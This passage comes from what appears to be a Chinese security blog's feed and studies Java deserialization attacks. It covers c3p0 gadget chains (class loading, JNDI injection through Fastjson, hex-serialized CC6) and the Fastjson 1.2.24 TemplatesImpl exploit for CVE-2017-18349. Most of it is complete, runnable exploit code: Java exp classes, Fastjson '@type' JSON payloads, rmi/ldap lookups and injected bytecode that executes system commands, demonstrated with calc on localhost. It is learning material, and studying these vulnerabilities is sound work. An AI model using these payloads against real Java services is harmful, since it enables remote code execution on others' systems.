class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(poolBackedDataSourceBase, loader);  </span><br><span class="line">        <span class="keyword">return</span> poolBackedDataSourceBase;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被加载的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;clac main&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713163006.png" alt="image.png"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>这条链子依赖于Fastjson或Jackson反序列化漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#修改jndiName</span><br><span class="line">JndiRefConnectionPoolDataSource#setJndiName -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setJndiName</span><br><span class="line"> </span><br><span class="line">#JNDI调用</span><br><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure><p>添加fastjson依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>漏洞点位于<code>com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource</code></p><p>这个中有非常多的getter和setter, 可以配合fastjson来设置<code>jndiname</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#修改jndiName</span><br><span class="line">JndiRefConnectionPoolDataSource#setJndiName -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setJndiName</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 触发jndi查询</span><br><span class="line">com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource.setLoginTimeout -&gt;</span><br><span class="line">com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.setLoginTimeout -&gt;</span><br><span class="line">com.mchange.v2.c3p0.JndiRefForwardingDataSource.setLoginTimeout -&gt; </span><br><span class="line">inner() -&gt; </span><br><span class="line">dereference -&gt; </span><br><span class="line">ctx.lookup</span><br></pre></td></tr></table></figure><p>有了调用链就可以直接写出fastjson的利用payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource&quot;,</span><br><span class="line">&quot;jndiName&quot;: &quot;rmi://127.0.0.1:1099/gx9xh5&quot;,</span><br><span class="line">&quot;loginTimeout&quot;: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="设置jndiname"><a href="#设置jndiname" class="headerlink" title="设置jndiname"></a>设置jndiname</h4><p>首先来看设置jndiname<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220305.png" alt="image.png"></p><p><code>jrfds</code>是<code>JndiRefForwardingDataSource</code>的实例, <code>JndiRefForwardingDataSource</code>继承<code>JndiRefDataSourceBase</code>的setJndiName方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220319.png" alt="image.png"></p><h4 id="触发jndi查询"><a href="#触发jndi查询" class="headerlink" title="触发jndi查询"></a>触发jndi查询</h4><p>fastjson触发setLoginTimeout这个setter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220538.png" alt="image.png"><br>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220613.png" alt="image.png"></p><p>setLoginTimeout来自于javax.sql.CommonDataSource接口<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220658.png" alt="image.png"></p><p>JndiRefForwardingDataSource实现了该接口, 且setLoginTimeout方法可以触发到jndi查询<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220920.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713220950.png" alt="image.png"></p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exp.c3p0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIexpWithFastJson</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\t\&quot;@type\&quot;: \&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\t\&quot;JndiName\&quot;: \&quot;ldap://127.0.0.1:1389/gx9xh5\&quot;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\t\&quot;LoginTimeout\&quot;: 1\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713213946.png" alt="image.png"></p><h2 id="利用HEX序列化字节加载器进行反序列化攻击"><a href="#利用HEX序列化字节加载器进行反序列化攻击" class="headerlink" title="利用HEX序列化字节加载器进行反序列化攻击"></a>利用HEX序列化字节加载器进行反序列化攻击</h2><p>这个链发生在上面的<code>WrapperConnectionPoolDataSource</code>类的构造函数中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt; </span><br><span class="line">com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString -&gt;</span><br><span class="line">com.mchange.v2.ser.SerializableUtils#fromByteArray -&gt;</span><br><span class="line">com.mchange.v2.ser#deserializeFromByteArray -&gt;</span><br><span class="line">readObject()</span><br></pre></td></tr></table></figure><h3 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p>看一下调用处的代码片段<br>首先是构造函数<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223344.png" alt="image.png"><br>将userOverridesAsString作为参数传进去</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223430.png" alt="image.png"><br>去掉字符串首部的<code>HASM_HEADER</code>(<code>&quot;HexAsciiSerializedMap&quot;</code>) 和尾部的一个字符</p><p>反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223608.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250713223617.png" alt="image.png"></p><h3 id="最终exp-1"><a href="#最终exp-1" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exp.c3p0;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">deserialHexString</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> getHexString();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        System.out.println(payload);  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;  </span><br><span class="line">        sw.write(toHexDigit(h1));  </span><br><span class="line">        sw.write(toHexDigit(h2));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">char</span> out;  </span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);  </span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);  </span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);  </span></span><br><span class="line">        <span class="keyword">return</span> out;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//将类序列化为字节数组  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(o);  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//字节数组转十六进制  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;  </span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)  </span><br><span class="line">            addHexAscii(bytes[i], sw);  </span><br><span class="line">        <span class="keyword">return</span> sw.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getHexString</span><span class="params">()</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">evil</span> <span class="operator">=</span> CC6();  </span><br><span class="line">        <span class="type">byte</span>[] bytes = tobyteArray(evil);  </span><br><span class="line">  </span><br><span class="line">        hexString = toHexAscii(bytes);  </span><br><span class="line">        <span class="keyword">return</span> hexString;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//CC6的利用链  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="comment">//使用InvokeTransformer包装一下  </span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line">  </span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;abc&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;eee&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//反射修改LazyMap类的factory属性  </span></span><br><span class="line">        Class clazz=LazyMap.class;  </span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> hashMap2;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c3p0不出网利用"><a href="#c3p0不出网利用" class="headerlink" title="c3p0不出网利用"></a>c3p0不出网利用</h2><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1749&quot;&gt;https://goodapple.top/archives/1749&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;组件介绍&quot;&gt;&lt;a href=&quot;#组件介绍&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="JavaSec" scheme="http://example.com/categories/JavaSec/"/>
    
    
    <category term="C3P0" scheme="http://example.com/tags/C3P0/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson反序列化</title>
    <link href="http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-09-10T06:46:57.000Z</published>
    <updated>2025-09-10T06:47:38.372Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)</h2><p>之前虽然也学了fastjson历史漏洞, 也跟着其他师傅的文章调试了一遍, 但大多囫囵吞枣, 也忘得差不多了, 最近又遇到很多fastjson的题目, 打算不看文章, 自己重新过一遍fastjson反序列化的流程, 文中解释与用词可能不太准确, 师傅们轻喷</p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>先看exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonWithTemplatesImpl</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">randonClassName</span> <span class="operator">=</span> <span class="string">&quot;n4c1&quot;</span> + System.nanoTime();  </span><br><span class="line">        cc.setName(randonClassName);  </span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCodeBase64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVIL_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + EVIL_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCodeBase64 + <span class="string">&quot;\&quot;],&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;  </span><br><span class="line">            System.out.println(payload);  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField); <span class="comment">// 允许反序列化非公有属性  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 